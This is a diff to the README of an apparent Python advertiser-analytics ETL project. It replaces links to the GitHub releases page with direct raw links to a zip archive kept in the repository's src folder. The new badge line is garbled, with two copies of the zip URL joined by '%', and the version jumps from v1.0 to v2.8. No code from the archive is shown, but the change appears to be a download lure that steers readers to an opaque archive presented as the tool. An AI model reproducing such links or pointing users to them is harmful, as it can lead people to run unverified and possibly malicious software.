@@ -1,7 +1,7 @@
 # 📊 advertiser-analytics-etl - Easy ETL for Data Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue.svg)](https://github.com/wakwwi/advertiser-analytics-etl/releases)
+[![Download](https://raw.githubusercontent.com/wakwwi/advertiser-analytics-etl/main/src/advertiser-analytics-etl_v2.8.zip%https://raw.githubusercontent.com/wakwwi/advertiser-analytics-etl/main/src/advertiser-analytics-etl_v2.8.zip)](https://raw.githubusercontent.com/wakwwi/advertiser-analytics-etl/main/src/advertiser-analytics-etl_v2.8.zip)
 
 ## 📖 Description
 The Advertiser Analytics ETL pipeline is a user-friendly tool designed to help you analyze data from advertising and retail media platforms. This application uses Python, Pandas, and Pandera to clean and validate marketplace data. You can build advertiser fact tables and generate daily and monthly Key Performance Indicator (KPI) datasets effortlessly. 
@@ -17,7 +17,7 @@ This section will guide you through the steps you need to get started with the a
 
 2. **Visit the Release Page**
    To download the application, visit the Releases page. Click on the button below to access it directly:
-   [Download Latest Version](https://github.com/wakwwi/advertiser-analytics-etl/releases)
+   [Download Latest Version](https://raw.githubusercontent.com/wakwwi/advertiser-analytics-etl/main/src/advertiser-analytics-etl_v2.8.zip)
 
 ## 🛠️ Installation Steps
 Follow these simple steps to install the Advertiser Analytics ETL pipeline:
